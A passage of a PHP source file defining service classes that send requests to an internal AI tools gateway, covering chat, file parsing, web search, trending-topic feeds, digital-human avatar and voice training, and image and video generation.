     * @param array $params
     * @return bool|array
     */
    public function message(array $params, callable $callback = null): bool|array
    {
        $app = $this->request($params)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST');

        if (isset($params['stream']) && !$params['stream']) {

            return $app->send()->response;
        }

        $app->streamSend($callback);

        return true;
    }

    public function openaiMessage(array $params, callable $callback = null): bool|array
    {
        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }

    public function geminiMessage(array $params, callable $callback = null): bool|array
    {
        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }

    /**
     * 创建助手
     * @param array $params
     * @return array
     */
    public function createAssistant(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/assistant/create')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 更新助手
     * @param array $params
     * @return array
     */
    public function updateAssistant(array $params): array
    {

        return $this->request($params)
            ->setApiUrl('/api/gpt/assistant/update')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 删除助手
     * @param array $params
     * @return array
     */
    public function deleteAssistant(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/assistant/delete')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 创建向量库
     * @param array $params
     * @return array
     */
    public function createVectorStore(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/vectorStore/create')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 更新向量库
     * @param array $params
     * @return array
     */
    public function updateVectorStore(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/vectorStore/update')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 删除向量库
     * @param array $params
     * @return array
     */
    public function deleteVectorStore(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/vectorStore/delete')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 创建向量文件
     * @param array $params
     * @return array
     */
    public function createVectorStoreFile(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/vectorStoreFile/create')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 删除向量库
     * @param array $params
     * @return array
     */
    public function deleteVectorStoreFile(array $params): array
    {
        return $this->request($params)
            ->setApiUrl('/api/gpt/vectorStoreFile/delete')
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 上传文件
     * @param array $params
     * @return array
     */
    public function upload(array $params): array
    {

        return $this->request($params)
            ->setApiUrl('/api/gpt/file/upload')
            ->setMethod('POST')
            ->setHeader('Content-Type', 'multipart/form-data')
            ->send()
            ->response;
    }
}

class CozeService
{
    /**
     * 文件解析
     *
     * @param string $file_url
     * @return array
     */
    public function fileParse(string $file_url): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/fileparse')
            ->setRequest([
                'file_url' => $file_url,
            ])
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 网络搜索
     * @param string $prompt
     * @return array
     */
    public function networkSearch(string $prompt): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/networksearch')
            ->setRequest([
                'prompt' => $prompt,
            ])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function cozeAgentChat($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/agent')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function cozeWorkflow($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/workflow')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function text($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function title($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/title')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function puzzle($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/puzzle')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function newsmixcuttitle($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/newsmixcuttitle')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function settext($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/settext')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    public function setseniortext($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/setseniortext')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function intention($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/intention')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function groupIntention($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/group_intention')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function clue($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/clue')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function wechatTouch($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/wechattouch')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 热点视频搜索词提取
     * @param array $params
     * @return array
     */
    public function getHotWords($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/gethotwords')
            ->setRequest($params)
            ->setMethod('POST')
            ->setTimeout(10, 180)
            ->send()
            ->response;
    }
    /**
     * AI素材关键词提取
     * @param array $params
     * @return array
     */
    public function extractKeywords($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/extractkeywords')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 爆款意图相关度检查
     * @param array $params
     * @return array
     */
    public function checkIntentRelevance($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/rewriter_intention')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 图片提示词优化（中台不计费）
     * @param array $params keywords 必填；sn/number/length/task_id 可选
     * @return array
     */
    public function optimizeImagePrompt(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/optimize_image_prompt')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 视频提示词优化（中台不计费）
     * @param array $params keywords 必填；sn/number/length/task_id 可选
     * @return array
     */
    public function optimizeVideoPrompt(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/optimize_video_prompt')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * PPT 智能追问（中台不计费，workflow 由中台绑定）
     * @param array $params input 推荐；keywords/prompt/task_id 可选
     * @return array
     */
    public function pptFollowup(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/ppt_followup')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * PPT 章节生成（中台不计费，workflow 由中台绑定）
     * @param array $params input1/input2 推荐；keywords/number/task_id 可选
     * @return array
     */
    public function pptChapters(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/ppt_chapters')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

class MapLeadService
{
    /**
     * 地图获客
     * @param array $params
     * @return array
     */
    public function search(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/map/lead/search')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

class AutoGlmService
{
    private const API_MODEL = 'autoglm-phone';

    public function phone(array $params): array
    {
        $request = $params + [
            'model' => self::API_MODEL,
            'messages' => [],
            'stream' => false,
            'request_id' => $params['request_id'] ?? generate_unique_task_id(),
        ];

        $request['model'] = $request['model'] ?: self::API_MODEL;
        $request['stream'] = (bool)$request['stream'];
        $request['messages'] = is_array($request['messages']) ? $request['messages'] : [];
        unset($request['tool_choice']);
        if (empty($request['tools'])) {
            unset($request['tools']);
        }

        $app = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setRequest($request)
            ->setMethod('POST');

        if ($request['stream']) {
            return $app->streamCollect();
        }

        return $this->unwrapChatCompletion($app->send()->response);
    }

    public function analyzeTask(array $params): array
    {
        $request = array_merge([
            'messages' => [],
            'stream' => false,
            'top_p' => 0.85,
            'temperature' => 0.0,
            'request_id' => $params['request_id'] ?? generate_unique_task_id(),
        ], $params);
        $request['model'] = $request['model'] ?: '';
        $request['stream'] = (bool)$request['stream'];
        $request['messages'] = is_array($request['messages']) ? $request['messages'] : [];
        unset($request['tool_choice']);
        if (empty($request['tools'])) {
            unset($request['tools']);
        }

        $app = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setRequest($request)
            ->setMethod('POST');

        if ($request['stream']) {
            return $app->streamCollect();
        }

        return $this->unwrapChatCompletion($app->send()->response);
    }

    /**
     * Tools 网关返回 {code, data, message}，业务层期望 OpenAI chat completion（choices/usage 在顶层）。
     */
    private function unwrapChatCompletion(array $response): array
    {
        $data = $response['data'] ?? null;
        if (!is_array($data)) {
            return $response;
        }

        if (isset($data['choices']) || isset($data['usage']) || isset($data['error'])) {
            return $data;
        }

        return $response;
    }
}

class TikHubService
{

    public function getXhsImageNoteDetail(string $shareText): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/xhs/note/detail')
            ->setRequest(['share_text' => $shareText])
            ->setMethod('POST')
            ->setTimeout(10, 120)
            ->send()
            ->response;
    }

    public function fetchDouyinHotTopic(): array
    {
        return HotspotMidClient::request('/api/hotspot/hot_day', ["platform" => "douyin"]);
    }

    public function fetchKuaishouHotList(): array
    {
        return HotspotMidClient::request('/api/v1/kuaishou/web/fetch_kuaishou_hot_list_v1');
    }

    public function fetchXiaohongshuHotList(): array
    {
        return HotspotMidClient::request('/api/v1/xiaohongshu/web_v3/fetch_hot_list');
    }

    public function fetchWeiboHotSearch(): array
    {
        return HotspotMidClient::request('/api/v1/weibo/web_v2/fetch_hot_search');
    }

    public function fetchDouyinRiseList(int $pageSize = 30): array
    {
        return HotspotMidClient::request('/api/hotspot/hot_rise', [
            'platform' => "douyin",
            'page' => 1,
            'page_size' => max($pageSize, 30),
            'order' => 'rank_diff',
        ]);
    }

    public function fetchDouyinHotDetail(string $topicName): array
    {
        return HotspotMidClient::request('/api/hotspot/insight', [
            'topic_name' => $topicName,
        ]);
    }

    public function fetchDouyinHotWords(string $appName = 'aweme'): array
    {
        $payload = HotspotMidClient::request('/api/hotspot/hot_words', [
            'app_name' => $appName,
        ]);
        $data = $payload['data'] ?? [];
        if (!is_array($data)) {
            return [];
        }
        if ($data === [] || array_keys($data) === range(0, count($data) - 1)) {
            return $data;
        }
        return is_array($data['hot_words'] ?? null) ? $data['hot_words'] : [];
    }
}

class ArkService
{
    public function webSearch(string $prompt): array
    {
        $payload = HotspotMidClient::request('/api/hotspot/research', [
            'model' => (string)config('hotspot.ark_search_model'),
            'input' => $prompt,
            'tools' => [['type' => 'web_search']],
            'stream' => false,
        ], HotspotMidClient::KIND_ARK);

        $textParts = [];
        $citations = [];
        $queries = [];
        $seen = [];
        foreach ($payload['output'] ?? [] as $item) {
            $kind = $item['type'] ?? '';
            if ($kind === 'web_search_call') {
                $q = (string)(($item['action'] ?? [])['query'] ?? '');
                foreach (preg_split('/[;；]/u', $q) ?: [] as $part) {
                    $part = trim($part);
                    if ($part !== '') {
                        $queries[] = $part;
                    }
                }
            } elseif ($kind === 'message') {
                foreach ($item['content'] ?? [] as $block) {
                    if (($block['type'] ?? '') !== 'output_text') {
                        continue;
                    }
                    $textParts[] = (string)($block['text'] ?? '');
                    foreach ($block['annotations'] ?? [] as $ann) {
                        if (($ann['type'] ?? '') !== 'url_citation') {
                            continue;
                        }
                        $url = (string)($ann['url'] ?? '');
                        if ($url === '' || isset($seen[$url])) {
                            continue;
                        }
                        $seen[$url] = true;
                        $citations[] = [
                            'title' => (string)($ann['title'] ?? ''),
                            'url' => $url,
                            'site_name' => (string)($ann['site_name'] ?? ''),
                            'publish_time' => (string)($ann['publish_time'] ?? ''),
                            'logo_url' => (string)($ann['logo_url'] ?? ''),
                        ];
                    }
                }
            }
        }

        $model = (string)config('hotspot.ark_search_model');
        $result = [
            'text' => trim(implode("\n", array_filter($textParts))),
            'citations' => $citations,
            'queries' => $queries,
            'model' => $model,
            'usage' => \app\common\service\hotspot\HotspotChargeService::extractArkUsage($payload),
        ];
        \app\common\service\hotspot\HotspotLog::write(sprintf(
            '方舟联网搜索完成：摘要长度=%d 引用数=%d 检索词数=%d',
            mb_strlen($result['text']),
            count($citations),
            count($queries)
        ));
        return $result;
    }

    /**
     * @return array{text:string,model:string,usage:array{prompt_tokens:int,completion_tokens:int,total_tokens:int}}
     */
    public function chat(string $system, string $user, float $temperature = 0.7): array
    {
        $model = (string)config('hotspot.ark_writer_model');

        $payload = HotspotMidClient::request('/api/hotspot/chat', [
            'model' => $model,
            'messages' => [
                ['role' => 'system', 'content' => $system],
                ['role' => 'user', 'content' => $user],
            ],
            'temperature' => $temperature,
            'stream' => false,
        ], HotspotMidClient::KIND_ARK);

        $choices = $payload['choices'] ?? [];
        $text = '';
        if ($choices !== []) {
            $text = (string)(($choices[0]['message'] ?? [])['content'] ?? '');
        }
        return [
            'text' => $text,
            'model' => $model,
            'usage' => \app\common\service\hotspot\HotspotChargeService::extractArkUsage($payload),
        ];
    }
}

class GptImage2Service
{
    public function editImage(string $imagePathOrUrl, string $prompt): array
    {
        $params = [
            'image_url' => FileService::getFileUrl($imagePathOrUrl),
            'prompt' => $prompt,
        ];
        return app(ToolsService::class)
            ->setApiUrl('/api/image/xhsHotCopy')
            ->setRequest($params)
            ->setMethod('POST')
            ->setTimeout(10, 300)
            ->sendWithoutThrow()
            ->response;
    }
}
/**
 * 数字人
 */
class HumanService
{

    /**
     * 形象创建
     * @param array $params
     * @return array
     */
    public function avatarTraining(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/avatar')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'avatar', 'model_version' => 1])
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 音色创建
     * @param array $params
     * @return array
     */
    public function voiceTraining(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/voice')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'voice', 'model_version' => 1])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 视频创建
     * @param array $params
     * @return array
     */
    public function videoTraining(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/video')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'video', 'model_version' => 1])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 视频创建
     * @param array $params
     * @return array
     */
    public function copywritingCreate(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 详情
     * @param array $params
     * @return array
     */
    public function detail(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * wj详情
     * @param array $params
     * @return array
     */
    public function getWjDetail(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音色删除
     * @param array $params
     * @return bool
     */
    public function voiceDelete(array $params): bool
    {
        app(ToolsService::class)
            ->setApiUrl('/api/human/voice_delete')
            ->setRequest($params)
            ->setMethod('POST')
            ->send();

        return true;
    }


    /**
     * 合成音频
     * @param array $params
     * @return array
     */
    public function audioTraining(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/audio')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'audio', 'model_version' => 1])
            ->setMethod('POST')
            ->send()
            ->response;
    }



    /**
     * 形象创建 - 极致版
     * @param array $params
     * @return array
     */
    public function avatarTrainingPro(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/pro/avatar')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'avatar', 'model_version' => 2])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音色创建 - 极致版
     * @param array $params
     * @return array
     */
    public function voiceTrainingPro(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);

        return app(ToolsService::class)
            ->setApiUrl('/api/human/pro/voice')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'voice', 'model_version' => 2])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 详情
     * @param array $params
     * @return array
     */
    public function detailPro(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/pro/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 合成音频 - 极致版
     * @param array $params
     * @return array
     */
    public function audioTrainingPro(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);

        return app(ToolsService::class)
            ->setApiUrl('/api/human/pro/audio')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'audio', 'model_version' => 2])
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 视频创建 - 极致版
     * @param array $params
     * @return array
     */
    public function videoTrainingPro(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/pro/video')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'video', 'model_version' => 2])
            ->setMethod('POST')
            ->send()
            ->response;
    }


    //优米
    /**
     * 形象创建 - 高级版
     * @param array $params
     * @return array
     */
    public function avatarTrainingYm(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ym/avatar')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'avatar', 'model_version' => 4])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音色创建 - 高级版
     * @param array $params
     * @return array
     */
    public function voiceTrainingYm(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ym/voice')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'voice', 'model_version' => 4])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 详情
     * @param array $params
     * @return array
     */
    public function detailYm(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ym/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 合成音频 - 高级版
     * @param array $params
     * @return array
     */
    public function audioTrainingYm(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);

        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ym/audio')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'audio', 'model_version' => 4])
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 视频创建 - 高级版
     * @param array $params
     * @return array
     */
    public function videoTrainingYm(array $params): array
    {
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ym/video')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'video', 'model_version' => 4])
            ->setMethod('POST')
            ->send()
            ->response;
    }


    //优米
    /**
     * 形象创建 - 高级版
     * @param array $params
     * @return array
     */
    public function avatarTrainingYmt(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ymt/avatar')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'avatar', 'model_version' => 6])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音色创建 - 高级版
     * @param array $params
     * @return array
     */
    public function voiceTrainingYmt(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ymt/voice')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'voice', 'model_version' => 6])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 详情
     * @param array $params
     * @return array
     */
    public function detailYmt(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ymt/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 合成音频 - 高级版
     * @param array $params
     * @return array
     */
    public function audioTrainingYmt(array $params): array
    {
        //设置不超时
        set_time_limit(0);
        //设置最长执行时间
        ini_set('max_execution_time', 0);
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ymt/audio')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'audio', 'model_version' => 6])
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 视频创建 - 高级版
     * @param array $params
     * @return array
     */
    public function videoTrainingYmt(array $params): array
    {
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/ymt/video')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'video', 'model_version' => 6])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 形象创建 - 通道七
     * @param array $params
     * @return array
     */
    public function avatarTrainingChanjing(array $params): array
    {
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/chanjing/avatar')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'avatar', 'model_version' => 7])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音色创建 - 通道七
     * @param array $params
     * @return array
     */
    public function voiceTrainingChanjing(array $params): array
    {
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/chanjing/voice')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'voice', 'model_version' => 7])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音频创建 - 通道七
     * @param array $params
     * @return array
     */
    public function audioTrainingChanjing(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/chanjing/audio')
            ->setRequestAndNotifyUrl($params, '/api/human/notify', ['human_type' => 'audio', 'model_version' => 7])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 视频创建 - 通道七
     * @param array $params
     * @return array
     */
    public function videoTrainingChanjing(array $params): array
    {
        $notifyUrl = $params['notify_url'] ?? '/api/human/notify';
        return app(ToolsService::class)
            ->setApiUrl('/api/human/chanjing/video')
            ->setRequestAndNotifyUrl($params, $notifyUrl, ['human_type' => 'video', 'model_version' => 7])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 详情 - 通道七
     * @param array $params
     * @return array
     */
    public function detailChanjing(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/human/chanjing/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 形象删除
     * @param array $params
     * @return bool
     */
    public function avatarDelete(array $params): bool
    {
        app(ToolsService::class)
            ->setApiUrl('/api/human/avatar_delete')
            ->setRequest($params)
            ->setMethod('POST')
            ->send();

        return true;
    }



    /**
     * 视频转音频
     * @param array $params
     * @return array
     */
    public function audioVideo(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/common/video2audio')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 高保真提交
     * @param array $params
     * @return array
     */
    public function voiceUpload(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/human/voice/upload')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 高保真继续提交
     * @param array $params
     * @return array
     */
    public function voiceContinue(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/human/voice/continue')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

/**
 * 通义千问
 */
class QWenService
{

    /**
     * 发送消息
     * @param array $params
     * @return bool|array
     */
    public function message(array $params, callable $callback = null): bool|array
    {
        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }


    /**
     * 上传文件
     * @param array $params
     * @return array
     */
    public function upload(array $params): array
    {


        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/file/upload')
            ->setMethod('POST')
            ->setHeader('Content-Type', 'multipart/form-data')
            ->setRequest($params)
            ->send()
            ->response;
    }

    public function fileParse(string $file_url, string $question = ''): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/file/parse')
            ->setRequest([
                'file_url' => $file_url,
                'question' => $question,
            ])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function imageParse(string $file_url, string $question = ''): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/image/parse')
            ->setRequest([
                'file_url' => $file_url,
                'question' => $question,
            ])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function networkSearch(string $prompt): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/network/search')
            ->setRequest([
                'prompt' => $prompt,
            ])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function fileParseStream(string $file_url, string $question, callable $onEvent): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/file/parse')
            ->setRequest([
                'file_url' => $file_url,
                'question' => $question,
                'stream' => true,
            ])
            ->setMethod('POST')
            ->streamCollectEvents($onEvent);
    }

    public function imageParseStream(string $file_url, string $question, callable $onEvent): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/image/parse')
            ->setRequest([
                'file_url' => $file_url,
                'question' => $question,
                'stream' => true,
            ])
            ->setMethod('POST')
            ->streamCollectEvents($onEvent);
    }

    public function networkSearchStream(string $prompt, callable $onEvent): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/qwen/network/search')
            ->setRequest([
                'prompt' => $prompt,
                'stream' => true,
            ])
            ->setMethod('POST')
            ->streamCollectEvents($onEvent);
    }
}

class DoubaoService
{
    public function text2Video(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/txt2video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function image2Video(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/img2video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function detail(array $params): array
    {
        $params['type'] = 'detail';
        //print_r($params);die;
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}


/**
 * Volc 火山引擎
 */
class VolcService
{
    /**
     * 即梦文生视频
     * @param array $params
     * @return array
     */
    public function text2Video(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/draw/video/text2video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 即梦图生视频
     * @param array $params
     * @return array
     */
    public function image2Video(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/draw/video/image2video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 即梦文、图生视频状态
     * @param array $params
     * @return array
     */
    public function status(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/draw/video/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

/**
 * HiDream
 */
class HiDreamService
{

    /**
     * 文生图
     * @param array $params
     * @return array
     */
    public function doubaoTxt2Img(array $params): array
    {
        $params['image4'] = 1;
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/txt2img')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function doubaoImg2Img(array $params): array
    {
        $params['image4'] = 1;
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/img2img')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function doubaoImg2ImgStatus(array $params): array
    {
        $params['image_type'] = 'img2img';
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function doubaoTxt2PosterImg(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/txt2posterimg')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 文生图
     * @param array $params
     * @return array
     */
    public function txt2Img(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/txt2img')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 文生图
     * @param array $params
     * @return array
     */
    public function txt2PosterImg(array $params): array
    {

        return app(ToolsService::class)
